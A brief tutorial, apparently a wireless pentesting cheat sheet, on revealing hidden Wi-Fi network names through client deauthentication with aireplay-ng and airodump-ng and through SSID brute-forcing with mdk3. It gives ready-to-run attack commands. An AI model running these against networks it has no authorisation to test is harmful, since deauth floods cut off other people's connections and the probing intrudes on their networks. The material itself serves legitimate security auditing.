# How to find hidden SSIDs
Hiding SSIDs is a superficial attempt at masking SSIDs from casual users and attackers by making it less visible. 2 methods to get their ESSID, deauth and bruteforcing.

## Deauth
If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name.
Run airodump live to see ESSID update:
```
sudo airodump-ng wlan1mon --band agp
```
On a second terminal, deauth target client MAC (`-c`) with AP MAC (`-a`)  (both found in dump):
```
sudo aireplay-ng -0 100 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
```
Watch live dump to see updated ESSID

## Brute forcing hidden SSID
With `mdk3`, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names:
```
sudo mdk3 <interface> <test mode> [test_ options]
```
Brute forcing all possible values:
```
sudo mdk3 wlan1mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```
Brute forcing using a wordlist:
```
sudo mdk3 wlan1mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```
